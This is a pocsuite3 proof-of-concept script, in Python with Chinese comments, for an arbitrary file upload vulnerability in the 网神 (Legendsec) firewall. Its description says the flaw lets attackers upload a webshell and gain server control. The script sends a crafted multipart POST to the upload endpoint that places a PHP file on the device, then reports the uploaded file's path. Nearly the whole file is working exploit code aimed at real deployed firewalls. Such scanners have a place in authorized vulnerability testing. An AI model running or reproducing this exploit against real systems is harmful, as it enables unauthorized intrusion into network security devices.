from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import base64
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '网神防火墙任意文件上传'
    appName = '网神防火墙'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''2022攻防演习期间，网神防火墙被曝存在任意文件上传漏洞，攻击者可以利用漏洞直接上传webshell获取服务器权限。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        target = self.url+"/?g=obj_app_upfile"
        headers={
            'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc',
            'Accept-Encoding': 'gzip',
        }
        data = '''------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"

10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="upfile"; filename="f3fCd7C2.php"
Content-Type: text/plain

<?php echo "12345";?>

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"

obj_app_upfile
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="__hash__"

0b9d6b1ab7479ab69d9f71b05e0e9445
------WebKitFormBoundaryJpMyThWnAxbcBBQc--'''
        try:
            r = requests.post(url=target,headers=headers,data=data,timeout=8,verify=False,allow_redirects=False)
            if r.status_code == 302 and "successfully uploaded" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                result['verifyInfo']['Path'] = self.url+"/attachements/f3fCd7C2.php"
                return self.parse_output(result)
        except:
            pass

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)